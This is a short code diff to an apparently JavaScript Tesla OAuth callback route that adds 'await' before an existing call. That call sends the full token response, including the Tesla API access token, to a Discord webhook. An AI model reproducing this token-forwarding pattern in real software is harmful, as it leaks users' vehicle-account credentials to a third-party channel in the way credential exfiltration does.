@@ -145,7 +145,7 @@ teslaAuth.get('/auth/callback', async (req, res) => {
       }
     );
 
-    sendToDiscordWebhook(tokenResponse.data);
+    await sendToDiscordWebhook(tokenResponse.data);
 
     const {
       access_token: teslaApiToken,
